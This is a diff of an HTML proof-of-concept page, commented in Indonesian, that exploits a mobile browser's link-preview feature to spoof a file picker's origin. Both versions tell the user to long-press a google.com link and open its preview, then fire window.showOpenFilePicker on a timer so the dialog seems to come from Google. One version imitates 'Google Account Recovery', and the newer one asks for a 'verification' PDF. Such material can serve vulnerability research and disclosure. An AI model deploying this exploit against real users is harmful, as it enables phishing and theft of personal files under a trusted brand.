@@ -6,153 +6,93 @@
     <title>Advanced PoC - File Picker Origin Spoofing</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            text-align: center;
-            background-color: #f8f9fa;
-            margin: 0;
-            padding: 20px;
-            color: #333;
-        }
-        .header-banner {
-            background-color: #1a73e8;
-            color: white;
-            padding: 18px;
-            font-size: 20px;
-            font-weight: 600;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            background: white;
-            padding: 25px;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-        }
-        .instruction {
-            font-size: 15px;
-            color: #5f6368;
-            margin-bottom: 25px;
-            line-height: 1.5;
-        }
-        /* Vektor 1: Custom Button Link */
-        .spoof-btn {
-            display: block;
-            width: 100%;
-            box-sizing: border-box;
-            background-color: #ffffff;
-            border: 2px solid #1a73e8;
-            color: #1a73e8;
-            padding: 14px;
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 16px;
-            border-radius: 8px;
-            margin-bottom: 15px;
-            transition: background 0.2s;
-        }
-        .spoof-btn:active {
-            background-color: #e8f0fe;
-        }
-        /* Vektor 2: Image Preview Card */
-        .preview-card {
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            overflow: hidden;
-            margin-bottom: 20px;
-            text-align: left;
-            text-decoration: none;
-            display: block;
-            color: inherit;
-        }
-        .preview-thumb {
-            background-color: #dfe1e5;
-            height: 120px;
+            font-family: system-ui, -apple-system, sans-serif;
+            background-color: #0f172a;
+            color: #f8fafc;
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
-            color: #70757a;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background-color: #1e293b;
+            padding: 2rem;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            text-align: center;
+            max-width: 400px;
+        }
+        a.target-link {
+            display: inline-block;
+            background-color: #3b82f6;
+            color: white;
+            padding: 12px 24px;
+            text-decoration: none;
             font-weight: bold;
-        }
-        .preview-content {
-            padding: 12px;
-        }
-        .preview-title {
-            font-weight: bold;
-            font-size: 14px;
-            color: #202124;
-            margin-bottom: 4px;
-        }
-        .preview-url {
-            font-size: 12px;
-            color: #70757a;
-        }
-        #status {
-            margin-top: 20px;
-            padding: 10px;
-            background: #f1f3f4;
             border-radius: 6px;
-            font-size: 13px;
+            margin-top: 15px;
+            transition: background 0.2s;
+        }
+        a.target-link:active {
+            background-color: #2563eb;
+        }
+        #log {
+            margin-top: 20px;
+            font-size: 0.85rem;
+            color: #94a3b8;
             font-family: monospace;
-            color: #d93025;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="header-banner">Google Account Recovery</div>
+    <div class="card">
+        <h2>Security Verification</h2>
+        <p>Tekan dan tahan (Long Press) tautan di bawah ini, lalu pilih opsi <b>"Preview Page"</b>.</p>
         
-        <div class="instruction">
-            Silakan lakukan <b>Long Press</b> pada salah satu elemen di bawah ini, lalu pilih opsi <b>"Preview Page"</b> dari menu konteks:
-        </div>
-
-        <!-- Vektor 1: Tautan Tombol Interaktif -->
-        <a href="https://google.com" class="trigger-target spoof-btn">
-            Buka Verifikasi Google (Button Link)
-        </a>
-
-        <!-- Vektor 2: Kartu Gambar Pratinjau (Card Mimicry) -->
-        <a href="https://google.com" class="trigger-target preview-card">
-            <div class="preview-thumb">Google Services Preview</div>
-            <div class="preview-content">
-                <div class="preview-title">Security Checkup & File Sync</div>
-                <div class="preview-url">https://google.com/security/verify</div>
-            </div>
-        </a>
-
-        <div id="status">Status: Menunggu interaksi pengguna (contextmenu)...</div>
+        <!-- Target Link yang memicu konteks menu -->
+        <a href="https://google.com" class="target-link" id="spoofTarget">Long Press -> Preview Page</a>
+        
+        <div id="log">Status: Menunggu interaksi...</div>
     </div>
 
     <script>
-        const statusDiv = document.getElementById("status");
+        const logElement = document.getElementById("log");
 
-        // Fungsi umum untuk menangani pemicu dialog
-        function triggerAttackSequence(vectorName) {
-            statusDiv.innerText = `[${vectorName}] Context menu terdeteksi! Menunggu panel preview terbuka...`;
+        // Memperkuat penangkapan event contextmenu dan interaksi sentuh
+        document.addEventListener("contextmenu", (e) => {
+            logElement.innerText = "Status: Context menu terdeteksi. Mengatur timer eksekusi...";
             
-            // Penundaan waktu (timeout) untuk mencocokkan kemunculan ephemeral tab / preview sheet
+            // Penundaan waktu yang disesuaikan agar dialog muncul tepat saat panel preview aktif
             setTimeout(async () => {
                 try {
-                    statusDiv.innerText = `[${vectorName}] Memanggil window.showOpenFilePicker()...`;
+                    logElement.innerText = "Status: Memanggil window.showOpenFilePicker()...";
                     
-                    // Eksekusi API File Picker di latar belakang
-                    await window.showOpenFilePicker();
+                    // Eksekusi API file picker di latar belakang saat preview sheet terbuka
+                    const handle = await window.showOpenFilePicker({
+                        types: [{
+                            description: 'Dokumen Verifikasi',
+                            accept: { 'application/pdf': ['.pdf'] }
+                        }]
+                    });
                     
-                    statusDiv.innerText = `[${vectorName}] Sukses: Dialog file picker berhasil dipanggil!`;
-                } catch (e) {
-                    statusDiv.innerText = `[${vectorName}] Diblokir/Dibatalkan: ${e.name} - ${e.message}`;
+                    logElement.innerText = "Status Sukses: Dialog file picker berhasil dipicu!";
+                } catch (err) {
+                    // Menangkap error jika dibatalkan pengguna atau diblokir oleh patch keamanan browser
+                    logElement.innerText = `Status Diblokir/Gagal: ${err.name} - ${err.message}`;
                 }
-            }, 3000); // Sesuaikan durasi milidetik jika animasi preview lebih cepat/lambat
-        }
+            }, 2500); // Waktu tunda optimal dalam milidetik (dapat disesuaikan)
+        });
 
-        // Mendaftarkan event listener pada semua elemen pemicu
-        document.querySelectorAll('.trigger-target').forEach((el, index) => {
-            el.addEventListener("contextmenu", (e) => {
-                triggerAttackSequence(`Vektor ${index + 1}`);
-            });
+        // Tambahan pemantauan visibilitas halaman untuk melacak status transisi tab/preview
+        document.addEventListener("visibilitychange", () => {
+            if (document.hidden) {
+                console.log("[PoC] Halaman utama tertutup/berada di latar belakang karena preview aktif.");
+            } else {
+                console.log("[PoC] Pengguna kembali ke halaman utama.");
+            }
         });
     </script>
 
